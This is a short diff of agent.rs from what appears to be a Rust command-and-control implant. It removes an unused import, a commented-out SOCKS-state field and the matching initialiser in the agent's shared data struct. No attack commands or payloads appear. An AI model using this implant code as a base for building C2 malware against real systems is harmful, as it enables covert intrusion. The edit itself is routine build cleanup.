@@ -1,7 +1,6 @@
 // agent.rs
 use crate::payloadvars;
 use crate::tasking::Tasker;
-// ELIMINA: use std::sync::Arc; (está generando warning de importación no utilizada)
 use chrono::prelude::{DateTime, NaiveDate};
 use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
 use rand::Rng;
@@ -81,8 +80,6 @@ pub struct SharedData {
     pub exit_agent: bool,
     pub working_start: NaiveTime,
     pub working_end: NaiveTime,
-    // CORRECCIÓN: Cambia el comentario de documentación a comentario normal
-    // pub socks_state: Option<Arc<SocksState>>,  
 }
 
 /// Main agent struct containing information with regards to C2 communication
@@ -112,7 +109,6 @@ impl Agent {
                 exit_agent: false,
                 working_start: payloadvars::working_start(),
                 working_end: payloadvars::working_end(),
-                socks_state: None,  // ← ADD THIS
             },
             c2profile,
             tasking: Tasker::new(),
